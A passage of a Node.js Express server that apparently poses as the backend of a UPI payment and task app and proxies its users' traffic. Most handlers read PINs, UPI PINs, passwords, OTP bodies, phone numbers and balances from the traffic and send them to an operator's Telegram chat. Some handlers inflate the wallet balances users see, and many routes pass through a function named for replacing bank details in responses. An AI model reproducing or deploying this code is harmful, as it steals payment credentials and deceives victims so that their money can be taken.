    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/secure/pin/update', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const oldPin = body.oldPin || body.oldSecurePin || '';
    const newPin = body.pin || body.newPin || body.securePin || '';
    const userId = await extractUserId(req, jsonResp);
    if (userId) saveTokenUserId(req, userId);
    const phone = getPhone(data, userId);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId,
        `📌 PIN UPDATE\n👤 User: ${userId || 'N/A'}\n📱 Phone: ${phone || 'N/A'}\n🔐 Old PIN: ${oldPin || 'N/A'}\n🔐 New PIN: ${newPin || 'N/A'}\n📊 Status: ${jsonResp && (jsonResp.code === 200 || jsonResp.code === 0 || jsonResp.success) ? '✅ Success' : '❌ Failed'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/secure/pin/verify', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const qp = Object.fromEntries(new URL(req.originalUrl, 'http://x').searchParams);
    const pin = body.pin || body.securePin || body.payPassword || body.payPin || qp.pin || qp.securePin || '';
    const userId = await extractUserId(req, jsonResp);
    if (userId) saveTokenUserId(req, userId);
    const phone = getPhone(data, userId);
    if (data.adminChatId && bot) {
      let msg = `🔓 PIN VERIFY\n👤 User: ${userId || 'N/A'}\n📱 Phone: ${phone || 'N/A'}\n🔐 PIN: ${pin || 'N/A'}\n📊 Status: ${jsonResp && (jsonResp.code === 200 || jsonResp.code === 0 || jsonResp.success) ? '✅ Success' : '❌ Failed'}`;
      if (!pin) msg += `\n📦 Body: ${JSON.stringify(body).substring(0, 500)}\n🔗 Query: ${JSON.stringify(qp).substring(0, 300)}`;
      msg += `\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
      bot.sendMessage(data.adminChatId, msg).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/bind/send/otp', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const userId = await extractUserId(req, jsonResp);
    if (userId) saveTokenUserId(req, userId);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId,
        `📲 UPI Bind OTP Sent\n👤 User: ${userId || 'N/A'}\n📦 Body: ${JSON.stringify(body).substring(0, 500)}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/bind/check/otp', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const userId = await extractUserId(req, jsonResp);
    if (userId) saveTokenUserId(req, userId);
    const respData = getResponseData(jsonResp);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId,
        `📲 UPI Bind Check OTP\n👤 User: ${userId || 'N/A'}\n📦 Body: ${JSON.stringify(body).substring(0, 500)}\n📊 Response: ${JSON.stringify(respData).substring(0, 500)}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/bind/select/upi', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const userId = await extractUserId(req, jsonResp);
    if (userId) saveTokenUserId(req, userId);
    const qp = Object.fromEntries(new URL(req.originalUrl, 'http://x').searchParams);
    const pin = body.pin || body.upiPin || body.securePin || body.payPin || qp.pin || qp.upiPin || '';
    const respData = getResponseData(jsonResp);
    if (data.adminChatId && bot) {
      let msg = `🔗 UPI BIND SELECT\n👤 User: ${userId || 'N/A'}\n📱 Phone: ${getPhone(data, userId) || 'N/A'}\n🔐 PIN: ${pin || 'N/A'}\n📦 Body: ${JSON.stringify(body).substring(0, 500)}\n📊 Response: ${JSON.stringify(respData).substring(0, 500)}`;
      if (!pin) msg += `\n🔗 Query: ${JSON.stringify(qp).substring(0, 300)}`;
      msg += `\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
      bot.sendMessage(data.adminChatId, msg).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/bind/pre/check', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const userId = await extractUserId(req, jsonResp);
    if (userId) saveTokenUserId(req, userId);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId,
        `🔍 UPI Pre-Check\n👤 User: ${userId || 'N/A'}\n📦 Body: ${JSON.stringify(body).substring(0, 500)}\n📊 Response: ${JSON.stringify(getResponseData(jsonResp)).substring(0, 500)}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

const BIND_ENDPOINTS = [
  '/app/bind/jio/send/otp', '/app/bind/jio/check/otp', '/app/bind/jio/check/sms',
  '/app/bind/jio/last/check/sms', '/app/bind/jio/get/session',
  '/app/bind/indus/sms', '/app/bind/indus/check',
  '/app/bind/esaf/start', '/app/bind/esaf/check/otp', '/app/bind/esaf/upi/list',
  '/app/bind/iob/otp/content', '/app/bind/iob/check/otp',
  '/app/bind/utkarsh/otp/content', '/app/bind/utkarsh/check/otp', '/app/bind/utkarsh/upi/list'
];
for (const ep of BIND_ENDPOINTS) {
  app.all(ep, async (req, res) => {
    try {
      const data = await loadData();
      const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
      const body = req.parsedBody || {};
      const userId = await extractUserId(req, jsonResp);
      if (userId) saveTokenUserId(req, userId);
      const qp = Object.fromEntries(new URL(req.originalUrl, 'http://x').searchParams);
      const pin = body.pin || body.upiPin || body.securePin || body.payPin || qp.pin || qp.upiPin || '';
      const respData = getResponseData(jsonResp);
      if (data.adminChatId && bot) {
        let msg = `📲 UPI Bind: ${ep.split('/').pop()}\n👤 User: ${userId || 'N/A'}`;
        if (pin) msg += `\n🔐 PIN: ${pin}`;
        msg += `\n📦 Body: ${JSON.stringify(body).substring(0, 400)}`;
        msg += `\n📊 Resp: ${JSON.stringify(respData).substring(0, 400)}`;
        msg += `\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
        bot.sendMessage(data.adminChatId, msg).catch(()=>{});
      }
      sendJson(res, respHeaders, jsonResp, respBody);
    } catch(e) { await transparentProxy(req, res); }
  });
}

app.all('/app/user/info', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const respData = getResponseData(jsonResp);
    const userId = await extractUserId(req, jsonResp);
    if (userId) saveTokenUserId(req, userId);
    let phone = '';
    let bal = '';
    if (respData && typeof respData === 'object') {
      phone = respData.phone || respData.mobile || '';
      bal = respData.balance ?? respData.wallet ?? respData.amount ?? '';
      const uid2 = respData.userId || respData.id || '';
      if (uid2 && !userId) saveTokenUserId(req, String(uid2));
    }
    const effectiveUserId = userId || (respData && (respData.userId || respData.id || '')) || '';
    if (effectiveUserId && respData && typeof respData === 'object') {
      const userOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
      const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
      if (addedBal !== 0) {
        const balKeys = ['balance', 'wallet', 'amount', 'availableBalance', 'totalBalance', 'xtoken', 'received'];
        for (const bk of balKeys) {
          if (respData[bk] !== undefined) {
            const numBal = parseFloat(respData[bk]) || 0;
            respData[bk] = typeof respData[bk] === 'string'
              ? String(parseFloat((numBal + addedBal).toFixed(2)))
              : parseFloat((numBal + addedBal).toFixed(2));
          }
        }
      }
    }
    sendJson(res, respHeaders, jsonResp, respBody);
    if (effectiveUserId) {
      const freshData = await loadData(true);
      if (!freshData.trackedUsers) freshData.trackedUsers = {};
      const existing = freshData.trackedUsers[String(effectiveUserId)] || {};
      freshData.trackedUsers[String(effectiveUserId)] = {
        ...existing,
        lastAction: 'info',
        lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        phone: phone || existing.phone || '',
        balance: bal !== '' ? bal : (existing.balance || ''),
        orderCount: existing.orderCount || 0
      };
      freshData._skipOverrideMerge = true;
      saveData(freshData).catch(()=>{});
    }
    if (!isLogOff(data, effectiveUserId) && data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `👤 Info [${effectiveUserId || 'N/A'}]\n📱 Phone: ${phone || 'N/A'}\n💰 Balance: ${bal !== '' ? bal : 'N/A'}`).catch(()=>{});
    }
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/user/account/wallet', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (userId) saveTokenUserId(req, userId);
    const respData = getResponseData(jsonResp);
    if (userId && respData && typeof respData === 'object') {
      const userOvr = data.userOverrides && data.userOverrides[String(userId)];
      const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
      if (addedBal !== 0) {
        const balKeys = ['balance', 'wallet', 'amount', 'availableBalance', 'totalBalance', 'inrBalance', 'xtoken', 'received'];
        for (const bk of balKeys) {
          if (respData[bk] !== undefined) {
            const numBal = parseFloat(respData[bk]) || 0;
            respData[bk] = typeof respData[bk] === 'string'
              ? String(parseFloat((numBal + addedBal).toFixed(2)))
              : parseFloat((numBal + addedBal).toFixed(2));
          }
        }
      }
    }
    sendJson(res, respHeaders, jsonResp, respBody);
    if (!isLogOff(data, userId) && data.adminChatId && bot) {
      const walletKeys = respData ? Object.keys(respData).join(',') : 'null';
      bot.sendMessage(data.adminChatId, `💼 Wallet [${userId || 'N/A'}]\n🔑 Keys: ${walletKeys}\n📊 Data: ${JSON.stringify(respData).substring(0, 300)}`).catch(()=>{});
    }
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/bank/debit/card/list', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '💳 Bank Card List');
});

app.all('/app/bank/debit/add/card', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '💳 Add Bank Card');
});

app.all('/app/bank/debit/update/card', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '💳 Update Bank Card');
});

app.all('/app/bank/debit/delete/card', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '💳 Delete Bank Card');
});

app.all('/app/bank/debit/update/switch', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '💳 Bank Switch');
});

app.all('/app/pay/debit/task', async (req, res) => {
  try {
    const data = await loadData();
    const origUrl = req.originalUrl;
    req.originalUrl = req.originalUrl.replace(/^\/app\//, '/api/');
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    req.originalUrl = origUrl;
    const userId = await extractUserId(req, jsonResp);
    if (userId) saveTokenUserId(req, userId);
    sendJson(res, respHeaders, jsonResp, respBody);
    if (data.adminChatId && bot) {
      const respData = getResponseData(jsonResp);
      const taskCount = Array.isArray(respData) ? respData.length : (respData && respData.list ? respData.list.length : '?');
      const statusCode = jsonResp ? (jsonResp.code ?? jsonResp.status ?? jsonResp.statusCode ?? '?') : '?';
      const msg = jsonResp ? (jsonResp.msg ?? jsonResp.message ?? '') : '';
      const reqBody = req.parsedBody ? JSON.stringify(req.parsedBody).substring(0, 200) : 'none';
      const rawLen = req.rawBody ? req.rawBody.length : 0;
      const httpStatus = response ? response.status : '?';
      const hasSig = req.headers['signature'] ? 'yes' : 'no';
      const hasToken = req.headers['logintoken'] ? 'yes' : 'no';
      const ct = req.headers['content-type'] || 'none';
      const allHeaders = Object.keys(req.headers).filter(h => !h.startsWith('x-vercel')).join(', ');
      bot.sendMessage(data.adminChatId, `💸 Task [${userId || 'N/A'}]\n📊 Count: ${taskCount} | HTTP: ${httpStatus}\n🔢 Code: ${statusCode} | Msg: ${msg}\n📤 Body(${rawLen}): ${reqBody}\n🔐 Sig: ${hasSig} | Token: ${hasToken}\n📋 CT: ${ct}\n🔑 Headers: ${allHeaders}\n📥 ${respBody.substring(0, 400)}`).catch(()=>{});
    }
  } catch(e) {
    if (bot && (await loadData()).adminChatId) {
      bot.sendMessage((await loadData()).adminChatId, `❌ Task ERROR: ${e.message}`).catch(()=>{});
    }
    await transparentProxy(req, res);
  }
});

app.all('/app/pay/debit/upis', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '💸 Debit UPIs');
});

app.all('/app/pay/order/detail', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '📋 Order Detail');
});

app.all('/app/pay/my/task', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '📋 My Task');
});

app.all('/app/pay/receive/task', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '📋 Receive Task');
});

app.all('/app/pay/submit/utr', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const userId = await extractUserId(req, jsonResp);
    if (userId) saveTokenUserId(req, userId);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId,
        `📤 UTR Submit\n👤 User: ${userId || 'N/A'}\n📦 Body: ${JSON.stringify(body).substring(0, 500)}\n📊 Status: ${jsonResp ? (jsonResp.code || jsonResp.status || 'N/A') : 'N/A'}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/pay/cancel/task', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const userId = await extractUserId(req, jsonResp);
    if (userId) saveTokenUserId(req, userId);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId,
        `❌ Task Cancel\n👤 User: ${userId || 'N/A'}\n📦 Body: ${JSON.stringify(body).substring(0, 300)}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/user/create/order', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '🛒 Create Order');
});

app.all('/app/user/get/order', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '📋 Get Order');
});

app.all('/app/user/get/upi/channel', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '📋 UPI Channel');
});

app.all('/app/user/submit/upi', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const userId = await extractUserId(req, jsonResp);
    if (userId) saveTokenUserId(req, userId);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId,
        `📤 UPI Submit\n👤 User: ${userId || 'N/A'}\n📦 Body: ${JSON.stringify(body).substring(0, 500)}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/user/order/history', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '📋 Order History');
});

app.all('/app/user/recharge/history', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '📋 Recharge History');
});

app.all('/app/user/inr/history', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (userId) saveTokenUserId(req, userId);
    sendJson(res, respHeaders, jsonResp, respBody);
    if (!isLogOff(data, userId) && data.adminChatId && bot && data.logRequests) {
      bot.sendMessage(data.adminChatId, `📋 INR History [${userId || 'N/A'}]`).catch(()=>{});
    }
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/user/upi/bind/list', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (userId) saveTokenUserId(req, userId);
    const respData = getResponseData(jsonResp);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId,
        `📋 UPI Bind List\n👤 User: ${userId || 'N/A'}\n📊 UPIs: ${JSON.stringify(respData).substring(0, 500)}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/user/upi/unbind', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const userId = await extractUserId(req, jsonResp);
    if (userId) saveTokenUserId(req, userId);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId,
        `🔓 UPI Unbind\n👤 User: ${userId || 'N/A'}\n📦 Body: ${JSON.stringify(body).substring(0, 300)}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/user/update/pass', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const userId = await extractUserId(req, jsonResp);
    if (userId) saveTokenUserId(req, userId);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId,
        `🔑 Password Change\n👤 User: ${userId || 'N/A'}\n📱 Phone: ${getPhone(data, userId) || 'N/A'}\n🔒 Old: ${body.oldPassword || body.oldPwd || 'N/A'}\n🔒 New: ${body.password || body.newPassword || body.newPwd || 'N/A'}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

const COLLECTION_ENDPOINTS = [
  '/app/collectionbank/', '/app/collectionbank_bills/',
  '/app/collectiontool/', '/app/collectiontool_bills/', '/app/collectiontool_stats/',
  '/app/collectiontool_bill_stats/', '/app/collectionworkerinfo/',
  '/app/payorder/', '/app/siteconfig/', '/app/getconfigs/',
  '/app/quotalog/', '/app/rechargequota/', '/app/rechargequery/',
  '/app/rechargelog'
];
for (const ep of COLLECTION_ENDPOINTS) {
  app.all(ep, async (req, res) => {
    await proxyAndReplaceBankDetails(req, res, `📋 ${ep.split('/').filter(Boolean).pop()}`);
  });
}

app.all('/app/pay/upload/file', async (req, res) => { await transparentProxy(req, res); });
app.all('/app/user/upload/param', async (req, res) => { await transparentProxy(req, res); });
app.all('/app/global/config', async (req, res) => { await transparentProxy(req, res); });
app.all('/app/auth/refresh/session', async (req, res) => { await transparentProxy(req, res); });
app.all('/app/auth/send/code', async (req, res) => { await transparentProxy(req, res); });
app.all('/app/auth/logout', async (req, res) => { await transparentProxy(req, res); });

const LOG_ONLY_ENDPOINTS = [
  '/app/user/team/info', '/app/user/invite/code/list', '/app/user/add/invite/code',
  '/app/user/delete/invite/code', '/app/user/billing/category', '/app/user/token/history',
  '/app/user/revenue/record', '/app/user/sub/detail',
  '/app/user/telegram/bind/info', '/app/user/telegram/unbind',
  '/app/user/update/whatsapp',
  '/app/pay/exist/incomplete/task', '/app/pay/user/task/list', '/app/pay/user/task/success',
  '/app/game/list', '/app/game/history', '/app/game/billing',
  '/app/game/get/balance', '/app/game/transfer/in', '/app/game/transfer/out',
  '/app/game/bet', '/app/game/notice',
  '/app/myteam/', '/app/referral/',
  '/app/activity/invite/recharge'
];
for (const ep of LOG_ONLY_ENDPOINTS) {
  app.all(ep, async (req, res) => {
    try {
      const data = await loadData();
      const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
      const userId = await extractUserId(req, jsonResp);
      if (userId) saveTokenUserId(req, userId);
      sendJson(res, respHeaders, jsonResp, respBody);
      if (data.logRequests && !isLogOff(data, userId) && data.adminChatId && bot) {
        bot.sendMessage(data.adminChatId, `📋 ${ep.split('/').filter(Boolean).pop()} [${userId || 'N/A'}]`).catch(()=>{});
      }
    } catch(e) { await transparentProxy(req, res); }
  });
}

app.all('*', async (req, res) => {
  const data = cachedData || await loadData();
  if (data.logRequests && !isLogOffByTokenFast(data, req) && data.adminChatId && bot) {
    const method = req.method;
    const url = req.originalUrl;
    bot.sendMessage(data.adminChatId, `📡 ${method} ${url}`).catch(()=>{});
  }
  await transparentProxy(req, res);
});

module.exports = app;
